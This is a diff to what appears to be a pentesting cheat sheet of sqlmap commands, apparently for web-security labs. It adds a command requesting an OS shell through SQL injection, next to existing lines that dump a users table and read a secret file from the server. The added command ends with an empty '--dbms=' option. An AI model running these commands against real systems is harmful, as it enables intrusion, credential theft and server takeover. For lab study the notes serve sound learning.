@@ -318,6 +318,17 @@ sqlmap- --url=<URL> -cookie=<COOKIE> --level 5 --risk 3 -p <PARAM-VULN> --batch 
 sqlmap -r <REQUEST-FROM-BURP.txt> --level=5 --risk=3
 sqlmap -r req.txt --level=5 --risk=3 --dump -D public -T users 
 
+sqlmap -u "http://<IP>?search=test" \
+  -p search \
+  --cookie="<LOGGED-COOKIE>" \
+  --level=3 --risk=2 \
+  --random-agent \
+  --os-shell \
+--dbms=
+
+
+
+
 ## READ SECRET
 
 sqlmap -u "<IP>/?category=Pets" -p category --file-read "/home/carlos/secret" -v 1
